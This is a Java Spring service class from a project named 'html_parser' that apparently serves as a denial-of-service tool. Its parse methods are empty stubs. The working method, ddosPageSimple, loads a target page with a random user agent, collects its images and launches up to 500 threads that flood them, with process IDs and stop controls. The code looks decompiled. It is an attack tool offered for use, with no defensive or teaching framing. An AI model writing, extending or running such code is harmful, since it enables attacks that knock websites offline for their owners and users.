package ua.bot.html_parser.service;

import org.json.JSONObject;
import org.jsoup.Connection;
import org.jsoup.Connection.Response;
import org.jsoup.Jsoup;
import org.jsoup.UnsupportedMimeTypeException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpStatus;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import ua.bot.html_parser.entity.ParseParameters;
import ua.bot.html_parser.entity.ParseType;
import ua.bot.html_parser.model.ResponseModel;
import ua.bot.html_parser.utils.DocumentElementsUtil;
import ua.bot.html_parser.utils.DocumentMemory;
import ua.bot.html_parser.utils.ProcessLogUtil;
import ua.bot.html_parser.utils.RandomStringGenerator;

import javax.net.ssl.SSLException;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@Service
public class ParseService {
    private static final Logger log = LoggerFactory.getLogger(ParseService.class);
    private final DocumentMemory documentMemory;
    private final DocumentElementsUtil documentElementsUtil;
    private final PageDdosService pageDdosService;
    private final ProcessLogUtil processLogUtil;
    private final RandomStringGenerator randomStringGenerator;
    private final ProcessService processService;
    private final int maxThread = 500;

    @Async
    void loadPage(String url) throws IOException {
        if (url != null) {
            log.info("Starting to load page");
            if (!documentMemory.getLastPageLoaded().equals(url)) {
                String randomString = randomStringGenerator.generateString();
                log.info("Generated user agent - {}", randomString);
                log.info("Trying to load page");
                Connection connection = Jsoup.connect(url).header("Accept", "*/*").header("Accept-Encoding", "gzip, deflate, br").followRedirects(true).timeout(50000).userAgent(randomString);
                log.info("Connection configuration created");

                try {
                    Response response = connection.execute();
                    log.info("Doc loaded");
                    documentMemory.setDocumentInMemory(response.parse());
                    documentMemory.setLastPageLoaded(url);
                } catch (SSLException | UnsupportedMimeTypeException var5) {
                    documentMemory.setFaultConnection(connection);
                    log.warn("Fault GET connection to URL - \"{}\"\n\t\tExecption messsage: {}", url, var5.getMessage());
                }
            }

        }
    }

    public boolean stopProcess() {
        log.info("Trying to stop process");
        if (pageDdosService.isRunning()) {
            log.info("Process running");
            boolean isWorking = pageDdosService.stopProcess();
            if (!isWorking) {
                log.info("Process stopped");
            }
        } else {
            log.info("Process is not in working state");
        }

        return this.pageDdosService.isRunning();
    }

    public boolean stopProcess(long processId) {
        log.info("Trying to stop process with ID {}", processId);
        if (pageDdosService.isRunning(processId)) {
            log.info("Process running");
            boolean isWorking = pageDdosService.stopMultipleProcess(processId);
            if (!isWorking) {
                log.info("Process with ID {} is stopped", processId);
            }
        } else {
            log.info("Process is not in working state");
        }

        return pageDdosService.isRunning();
    }

    public CompletableFuture<JSONObject> getPageInfo(String url) {
        JSONObject respond = null;
        if (url != null) {
            try {
                this.loadPage(url);
            } catch (IOException var4) {
                respond = new JSONObject();
                respond.append("status", "parse fail");
                respond.append("status code", HttpStatus.BAD_GATEWAY);
                respond.append("info", var4.getMessage());
            }
        }

        return CompletableFuture.completedFuture(respond);
    }

    public CompletableFuture<JSONObject> parsePageSimple(ResponseModel responseModel) {
        return null;
    }

    public CompletableFuture<JSONObject> parsePageCustom(ResponseModel responseModel) {
        return null;
    }

    public Map<String, Object> ddosPageSimple(ResponseModel responseModel) {
        validateParameters(responseModel);
        Logger var10000 = log;
        Objects.requireNonNull(this);
        var10000.info("MAX THREADS - {}", 500);
        Map<String, Object> noImagesOnUrl = new HashMap();
        noImagesOnUrl.put("status", "ddos fail");
        noImagesOnUrl.put("reason", "no objects found to ddos");
        if (responseModel == null) {
            return null;
        } else {
            ParseParameters parameters = (ParseParameters)responseModel.getParameters().get(0);

            HashMap respond;
            try {
                respond = new HashMap();
                loadPage(responseModel.getUrlToParse());
                List<String> images = documentElementsUtil.getAllImagesOnPage();
                ParseType parseType = (ParseType)parameters.getParseType().get(0);
                if (parseType == null) {
                    return null;
                }

                if (images == null || images.isEmpty()) {
                    return noImagesOnUrl;
                }

                long id = (new SecureRandom()).nextLong();
                int getImageToDdos = (new SecureRandom()).nextInt(images.size());
                if (id < 0L) {
                    id *= -1L;
                }

                if (responseModel.isMultithreaded()) {
                    log.info("Ddos is multithreaded");
                    log.info("Threads count - {}", responseModel.getThreadCount());
                    if (responseModel.getThreadCount() < 0) {
                        responseModel.setThreadCount(1);
                    }

                    if (responseModel.getThreadCount() > 500) {
                        responseModel.setThreadCount(500);
                    }

                    for(int i = 0; i < responseModel.getThreadCount(); ++i) {
                        System.out.println("PROCESS THREAD STARTED");
                        int imageFromList = (new SecureRandom()).nextInt(images.size());
                        this.pageDdosService.ddosPage(images.get(imageFromList), parameters, id);
                    }
                } else {
                    String imgUrl = images.get(getImageToDdos);
                    pageDdosService.ddosPage(imgUrl, parameters, id);
                }

                respond.put("status", "process started");
                respond.put("process_id", String.valueOf(id));
            } catch (IOException var13) {
                var13.printStackTrace();
                respond = new HashMap();
                respond.put("status", "parse fail");
                respond.put("status_code", String.valueOf(HttpStatus.BAD_GATEWAY));
                respond.put("info", var13.getMessage());
            }

            return respond;
        }
    }

    public Map<String, Object> getProcessLog(long id) {
        Map<String, Object> logMap = new HashMap();
        logMap.put("log", processLogUtil.getLogData(id));
        boolean stopped = !processService.isProcessingMultiple(id);
        logMap.put("stop", stopped);
        return logMap;
    }

    private boolean validateParameters(ResponseModel responseModel) {
        if (responseModel.getUrlToParse() == null) {
            return false;
        } else {
            if (responseModel.getParseConf() == null) {
                responseModel.setParseConf("simple");
            }

            ParseParameters parseParameters;
            ParseType parseType;
            if (responseModel.getParameters().size() == 0) {
                log.info("Response model parameters is null, setting default");
                parseParameters = new ParseParameters();
                parseParameters.setRegexParameters(Collections.emptyList());
                parseParameters.setParseTimeout(15L);
                parseParameters.setParseDelta((int)parseParameters.getParseTimeout() / 3);
                parseType = new ParseType();
                parseType.setDefault();
                parseParameters.setParseType(Collections.singletonList(parseType));
                parseParameters.setRegex(false);
                parseParameters.setElementsToGet(null);
                parseParameters.setRegexParameters(null);
            } else {
                parseParameters = responseModel.getParameters().get(0);
                if (parseParameters.getParseTimeout() == 0L) {
                    parseParameters.setParseTimeout(15L);
                }

                if (parseParameters.getParseDelta() == 0) {
                    parseParameters.setParseDelta(5);
                }

                if (parseParameters.getParseType().size() == 0) {
                    log.info("Response model has parameters, but parse type is null, setting default");
                    parseType = new ParseType();
                    parseType.setDefault();
                    parseParameters.setParseType(Collections.singletonList(parseType));
                } else {
                    parseType = parseParameters.getParseType().get(0);
                    if (parseType.getType().equals("by_time")) {
                        if (parseType.getTime() == 0L) {
                            parseType.setTime(1L);
                        }
                    } else if (parseType.getType().equals("by_count") && parseType.getCount() < 0L) {
                        parseType.setCount(10L);
                    }
                }
            }

            return true;
        }
    }

    public ParseService(final DocumentMemory documentMemory, final DocumentElementsUtil documentElementsUtil, final PageDdosService pageDdosService, final ProcessLogUtil processLogUtil, final RandomStringGenerator randomStringGenerator, final ProcessService processService) {
        this.documentMemory = documentMemory;
        this.documentElementsUtil = documentElementsUtil;
        this.pageDdosService = pageDdosService;
        this.processLogUtil = processLogUtil;
        this.randomStringGenerator = randomStringGenerator;
        this.processService = processService;
    }
}